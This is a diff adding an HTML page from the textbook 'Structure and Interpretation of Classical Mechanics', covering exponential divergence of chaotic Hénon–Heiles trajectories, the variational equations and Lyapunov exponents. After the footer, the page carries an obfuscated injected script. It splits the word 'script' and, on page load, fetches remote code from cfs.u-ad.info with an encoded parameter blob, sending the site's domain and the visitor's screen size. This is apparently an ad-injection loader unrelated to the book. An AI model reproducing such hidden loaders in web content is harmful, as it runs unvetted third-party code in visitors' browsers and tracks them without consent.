@@ -1,0 +1,148 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-42.html">previous</a></span><span>, <a href="book-Z-H-44.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_3.7"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_3.7">3.7&nbsp;&nbsp;Exponential Divergence</a></h2>
+<p><a name="%_idx_2012"></a>
+H&eacute;non and Heiles discovered that the chaotic trajectories had
+<a name="%_idx_2014"></a>remarkable sensitivity to small changes in initial
+conditions -- initially nearby chaotic trajectories separate roughly
+exponentially with time.  On the other hand, regular trajectories do
+not exhibit this sensitivity -- initially nearby <a name="%_idx_2016"></a><a name="%_idx_2018"></a>regular trajectories
+separate roughly linearly with time.</p>
+<p>
+Consider the evolution of two initially nearby trajectories for the
+H&eacute;non-Heiles problem, with energy <em>E</em> = 1/8.  Let
+<em>d</em>(<em>t</em>) be the usual Euclidean distance in the <em>x</em>, <em>y</em>, <em>p</em><sub><em>x</em></sub>, <em>p</em><sub><em>y</em></sub> space 
+between the two trajectories at time <em>t</em>.  Figure&nbsp;<a href="#FIGURE_3.23">3.23</a> shows the common
+logarithm of <em>d</em>(<em>t</em>)/<em>d</em>(0) as a function of time <em>t</em>.  We see that the
+divergence is well described as exponential.
+<a name="FIGURE_3.23"></a></p>
+<div align=left><img src="chap3-Z-G-158.gif" border="0"></div>
+<p></p>
+<p>
+On the other hand, the distance between two initially nearby regular
+trajectories grows much more slowly.
+Figure&nbsp;<a href="#FIGURE_3.24">3.24</a> shows the distance between two regular
+trajectories as a function of time.  The distance grows linearly with time.
+<a name="FIGURE_3.24"></a></p>
+<div align=left><img src="chap3-Z-G-159.gif" border="0"></div>
+<p></p>
+<p>
+It is remarkable that Hamiltonian systems have such radically
+different types of trajectories.  On the surface of section the
+chaotic and regular trajectories differ in the dimension of the space
+that they explore.  It is
+interesting that along with this dimensional difference there is a
+drastic difference in the way chaotic and regular trajectories
+separate.  For higher dimensional systems the surface of section technique is
+not as useful, but trajectories are still distinguished by the way
+neighboring trajectories diverge: some diverge exponentially whereas
+others diverge approximately linearly.  Exponential divergence is the
+hallmark of chaotic behavior.</p>
+<p>
+
+The rate of exponential divergence is quantified by the slope of the
+graph of log(<em>d</em>(<em>t</em>)/<em>d</em>(0)).  We can estimate the rate of exponential
+divergence of trajectories from a particular phase-space trajectory
+<img src="chap3-Z-G-D-5.gif" border="0"> by choosing a nearby trajectory <img src="chap3-Z-G-D-5.gif" border="0">' and computing
+<a name="EQUATION_3.140"></a></p>
+<div align=left><img src="chap3-Z-G-160.gif" border="0"></div>
+<p>
+where <em>d</em>(<em>t</em>)  =  || <img src="chap3-Z-G-D-5.gif" border="0">'(<em>t</em>)  <tt>-</tt>  <img src="chap3-Z-G-D-5.gif" border="0">(<em>t</em>) ||.
+<a name="%_idx_2020"></a>A problem with this ``two-trajectory'' method is
+illustrated in figure&nbsp;<a href="#FIGURE_3.23">3.23</a>.  For strongly chaotic
+trajectories two initially nearby trajectories soon find themselves as
+far apart as they can get.  Once this happens the distance no longer
+grows.  The estimate of the rate of divergence of trajectories is
+limited by this ``saturation.''</p>
+<p>
+
+We can improve on this method by studying a variational system of
+equations.  Let 
+<a name="EQUATION_3.141"></a></p>
+<div align=left><img src="chap3-Z-G-161.gif" border="0"></div>
+<p>
+be the system of equations governing the evolution of the system.
+A nearby trajectory <em>z</em>' satisfies
+<a name="EQUATION_3.142"></a></p>
+<div align=left><img src="chap3-Z-G-162.gif" border="0"></div>
+<p>
+The difference <img src="chap2-Z-G-D-10.gif" border="0">  =  <em>z</em>'  <tt>-</tt>  <em>z</em> between these trajectories satisfies
+<a name="EQUATION_3.143"></a></p>
+<div align=left><img src="chap3-Z-G-163.gif" border="0"></div>
+<p>
+If <img src="chap2-Z-G-D-10.gif" border="0"> is small we can approximate the right-hand side by a derivative
+<a name="EQUATION_3.144"></a></p>
+<div align=left><img src="chap3-Z-G-164.gif" border="0"></div>
+<p>
+This set of ordinary differential equations is called the <a name="%_idx_2022"></a><em>variational
+equations</em> for the system.  It is linear in <img src="chap2-Z-G-D-10.gif" border="0"> and driven by <em>z</em>.</p>
+<p>
+
+Let <em>d</em>(<em>t</em>)  =  || <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em>) ||; then the rate of divergence can be estimated
+as before.  The advantage of this ``variational method'' is that <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em>)
+can become arbitrarily large and its growth still measures the
+divergence of nearby trajectories.  We can see in
+figure&nbsp;<a href="#FIGURE_3.23">3.23</a> that the variational method gives
+nearly the same result as the two-trajectory method up to the point at
+which the two-trajectory method saturates.<a name="call_footnote_Temp_276" href="#footnote_Temp_276"><sup><small>30</small></sup></a></p>
+<p>
+<a name="%_idx_2026"></a>The <em>Lyapunov exponent</em> is defined to be the infinite time limit of <img src="chap1-Z-G-D-1.gif" border="0">(<em>t</em>),
+defined by equation&nbsp;(<a href="#EQUATION_3.140">3.140</a>), in which the
+distance <em>d</em> is computed by the variational method.  Actually, for each
+trajectory there are many Lyapunov exponents, depending on the initial
+direction of the variation <img src="chap2-Z-G-D-10.gif" border="0">.  For an <em>N</em>-dimensional system,
+there are <em>N</em>&nbsp;Lyapunov exponents.  For a randomly chosen <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em><sub>0</sub>),
+the subsequent growth of <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em>) has components that grow with each of
+the Lyapunov exponents.  In general, however, the growth of <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em>) will
+be dominated by the largest exponent.  The largest Lyapunov exponent
+thus can be interpreted as the typical rate of <a name="%_idx_2028"></a>exponential
+divergence of nearby trajectories.  The sum of the largest two
+Lyapunov exponents can be interpreted as the typical rate of growth of
+the area of two-dimensional elements.  This interpretation can be extended to 
+higher-dimensional elements: the rate of growth of volume elements is the
+sum of all the Lyapunov exponents.</p>
+<p>
+<a name="%_idx_2030"></a><a name="%_idx_2032"></a>In Hamiltonian systems, the Lyapunov
+exponents must satisfy constraints, which we will justify later.  Lyapunov
+exponents come in pairs: for every Lyapunov exponent <img src="chap1-Z-G-D-40.gif" border="0"> its
+negation  <tt>-</tt> <img src="chap1-Z-G-D-40.gif" border="0"> is also an exponent.  For every conserved
+quantity, one of the Lyapunov exponents is zero, as is its negation.
+So the Lyapunov exponents can be used to check for the existence of
+conserved quantities.  The sum of the Lyapunov exponents for a
+Hamiltonian system is zero, so volume elements do not grow exponentially.
+We will see in the next section that phase-space volume is
+actually conserved for Hamiltonian systems.</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_276" href="#call_footnote_Temp_276"><sup><small>30</small></sup></a> In strongly chaotic systems <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em>) may become so
+<a name="%_idx_2024"></a>  large that the computer can no longer represent it.  To prevent this
+we can replace <img src="chap2-Z-G-D-10.gif" border="0"> by <img src="chap2-Z-G-D-10.gif" border="0">/<em>c</em> whenever <img src="chap2-Z-G-D-10.gif" border="0">(<em>t</em>) becomes
+uncomfortably large.  The equation governing <img src="chap2-Z-G-D-10.gif" border="0"> is linear, so except
+for the scale change, the evolution is unchanged.  Of course we have
+to keep track of these scale changes when computing the average growth
+rate.  This process is called ``renormalization'' to make it sound 
+impressive.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-42.html">previous</a></span><span>, <a href="book-Z-H-44.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2JHFHTTmeGUzx7MU9wUEzsYnHgxq%2bpLPHKef6InA%2fTmUpGJYCymNBh35N2lbxNv9qalib2EzO%2bYoR49ZfI1WfOwGCbzF3z%2bLEPStcY22%2bii1jBKpWXnOL26qikBWNsat8dgi%2bUCRMoemQATs0xp0BoS%2fk6qf%2bPaX7i7KW%2blEOWGcux80sqIuNMayZ65wUBpgfDio2KMS%2bo%2b1qhg4FjBHLmPWeuLJD8Vcv35DX7RJHICz%2f6Fk3uk5%2fO%2f02GkVwARiYPfKXXWj2PZXEy%2fJi7ha2NmWGMIiBLpV%2bV2hz67h7J6Q%2bRDmzqJDr15IE%2fESAlbKKi73YBdZDAhmzdBgbjpEqZ3s36vFRgMzjRQaNAj4lirmASqAuTw9Qt4Qh8TAUmvf9JZ9wSRr8pxIkwgdwqbnBwSFf9YbULPOZAOplYHe%2bJ9%2f3u9TqGJgC9JP%2bUMmE2R4b%2fy5hRp3PeVTBgJm21ctH%2b");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
